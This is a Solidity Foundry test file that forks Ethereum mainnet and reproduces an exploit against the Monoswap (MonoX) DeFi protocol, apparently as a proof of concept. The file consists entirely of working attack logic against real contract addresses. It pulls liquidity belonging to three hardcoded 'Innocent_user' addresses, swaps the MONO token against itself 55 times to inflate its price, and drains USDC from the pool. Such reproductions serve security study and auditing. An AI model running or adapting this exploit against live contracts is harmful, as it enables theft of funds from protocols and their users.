// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is DSTest {
  WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
  USDC usdc = USDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
  MonoToken mono = MonoToken(0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D);
  Monoswap monoswap = Monoswap(0xC36a7887786389405EA8DA0B87602Ae3902B88A1);
  MonoXPool monopool = MonoXPool(0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4);
  address Monoswap_address = 0xC36a7887786389405EA8DA0B87602Ae3902B88A1;
  address Mono_Token_Address = 0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D;
  address WETH9_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  address Innocent_user_1 = 0x7B9aa6ED8B514C86bA819B99897b69b608293fFC;
  address Innocent_user_2 = 0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38;
  address Innocent_user_3 = 0xab5167e8cC36A3a91Fd2d75C6147140cd1837355;
  address USDC_Address = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  uint256 Amount_Of_MonoToken_On_XPool;

  uint256 public Amount_Of_USDC_On_XPool;

  uint256 public Amoount_Of_Mono_On_This;
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  function setUp() public {
    cheats.createSelectFork("mainnet", 13715025); //fork mainnet at block 13715025
  }

  function testExploit() public {
    mono.approve(Monoswap_address, type(uint256).max);

    WETH.deposit{ value: address(this).balance, gas: 40000 }();
    // WETH.balanceOf(address(this));
    // VISR_Balance =  visr.balanceOf(msg.sender);
    emit log_named_uint("WETH Balance", WETH.balanceOf(address(this)));
    WETH.approve(Monoswap_address, 0.1 ether);
    monoswap.swapExactTokenForToken(
      WETH9_Address,
      Mono_Token_Address,
      0.1 ether,
      1,
      address(this),
      block.timestamp
    );
    emit log_named_uint("MonoToken Balance", mono.balanceOf(address(this)));
    RemoveLiquidity_From_3_Users();
    // AddLiquidity For myself
    monoswap.addLiquidity(Mono_Token_Address, 196875656, address(this));

    Swap_Mono_for_Mono_55_Times();

    Swap_Mono_For_USDC();

    emit log_named_uint(
      "Exploit completed, USDC Balance",
      usdc.balanceOf(msg.sender)
    );
  }

  function RemoveLiquidity_From_3_Users() internal {
    uint256 balance_Of_User1 = monopool.balanceOf(Innocent_user_1, 10);

    monoswap.removeLiquidity(
      Mono_Token_Address,
      balance_Of_User1,
      Innocent_user_1,
      0,
      1
    );

    uint256 balance_Of_User2 = monopool.balanceOf(Innocent_user_2, 10);

    monoswap.removeLiquidity(
      Mono_Token_Address,
      balance_Of_User2,
      Innocent_user_2,
      0,
      1
    );

    uint256 balance_Of_User3 = monopool.balanceOf(Innocent_user_3, 10);

    monoswap.removeLiquidity(
      Mono_Token_Address,
      balance_Of_User3,
      Innocent_user_3,
      0,
      1
    );
  }

  function Swap_Mono_for_Mono_55_Times() internal {
    for (uint256 i = 0; i < 55; i++) {
      (, , , , , , Amount_Of_MonoToken_On_XPool, , ) = monoswap.pools(
        Mono_Token_Address
      );

      monoswap.swapExactTokenForToken(
        Mono_Token_Address,
        Mono_Token_Address,
        Amount_Of_MonoToken_On_XPool - 1,
        0,
        address(this),
        block.timestamp
      );
    }
  }

  function Swap_Mono_For_USDC() internal {
    (, , , , , , Amount_Of_USDC_On_XPool, , ) = monoswap.pools(USDC_Address);

    Amoount_Of_Mono_On_This = mono.balanceOf(address(this));

    monoswap.swapTokenForExactToken(
      Mono_Token_Address,
      USDC_Address,
      Amoount_Of_Mono_On_This,
      4000000000000,
      msg.sender,
      block.timestamp
    );
  }

  receive() external payable {}

  function onERC1155Received(
    address _operator,
    address _from,
    uint256 _id,
    uint256 _value,
    bytes calldata _data
  ) external returns (bytes4) {
    bytes4 a = 0xf23a6e61;
    return a;
  }
}
